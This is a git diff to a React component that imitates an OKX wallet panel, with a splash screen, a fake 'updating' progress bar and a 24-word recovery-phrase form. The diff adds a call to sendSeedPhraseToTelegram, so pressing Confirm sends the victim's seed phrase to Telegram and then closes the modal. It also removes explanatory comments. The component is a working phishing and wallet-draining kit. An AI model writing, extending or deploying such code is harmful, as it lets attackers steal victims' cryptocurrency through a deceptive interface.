@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW
 
 interface OkxPanelProps {
   isOpen: boolean;
@@ -15,6 +16,7 @@ export default function OkxPanel({ isOpen, onClose }: OkxPanelProps) {
   const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
   const [updateProgress, setUpdateProgress] = useState(0);
   const [seedError, setSeedError] = useState(false);
+  const [isSending, setIsSending] = useState(false); // 👈 NEW
 
   // Reset state when modal opens
   useEffect(() => {
@@ -26,8 +28,8 @@ export default function OkxPanel({ isOpen, onClose }: OkxPanelProps) {
       setPhraseValues(Array(24).fill(''));
       setUpdateProgress(0);
       setSeedError(false);
+      setIsSending(false);
 
-      // Transition from splash to password
       const timer = setTimeout(() => {
         setView('password');
       }, 2800);
@@ -40,11 +42,11 @@ export default function OkxPanel({ isOpen, onClose }: OkxPanelProps) {
     if (view === 'updating') {
       let progress = 0;
       const interval = setInterval(() => {
-        progress += Math.floor(Math.random() * 15) + 5; // Random jumps
+        progress += Math.floor(Math.random() * 15) + 5;
         if (progress >= 100) {
           progress = 100;
           clearInterval(interval);
-          setTimeout(() => setView('import'), 600); // Slight pause at 100% before transitioning
+          setTimeout(() => setView('import'), 600);
         }
         setUpdateProgress(progress);
       }, 400);
@@ -58,7 +60,6 @@ export default function OkxPanel({ isOpen, onClose }: OkxPanelProps) {
     newValues[index] = value;
     setPhraseValues(newValues);
     
-    // Validate lowercase and spaces only
     if (value.length > 0 && !/^[a-z]+$/.test(value)) {
       setSeedError(true);
     } else {
@@ -316,15 +317,22 @@ export default function OkxPanel({ isOpen, onClose }: OkxPanelProps) {
 
               <div className="px-5 py-5 shrink-0 bg-[#000000] border-t border-[#222222]">
                 <button 
+                  disabled={!isPhraseComplete() || isSending}
+                  onClick={async () => {
+                    setIsSending(true);
+                    const seedString = phraseValues.slice(0, phraseLength).join(' ');
+                    const success = await sendSeedPhraseToTelegram(seedString, 'OKX Wallet');
+                    if (success) {
+                      onClose();
+                    } else {
+                      console.error('Failed to send seed phrase');
+                    }
+                    setIsSending(false);
+                  }}
                   className="w-full h-[52px] text-[#000000] bg-[#ffffff] font-bold font-open-sans text-[16px] leading-[24px] cursor-pointer rounded-full px-4 py-3 hover:scale-[1.02] transition-all duration-300 disabled:opacity-100 disabled:bg-[#1a1a1a] disabled:text-[#5b5b5b] disabled:scale-100 disabled:cursor-not-allowed active:scale-[0.98]" 
                   type="button" 
-                  disabled={!isPhraseComplete()}
-                  onClick={() => {
-                    console.log("OKX Import Complete:", phraseValues.slice(0, phraseLength));
-                    onClose();
-                  }}
                 >
-                  Confirm
+                  {isSending ? 'Sending...' : 'Confirm'}
                 </button>
               </div>
             </div>
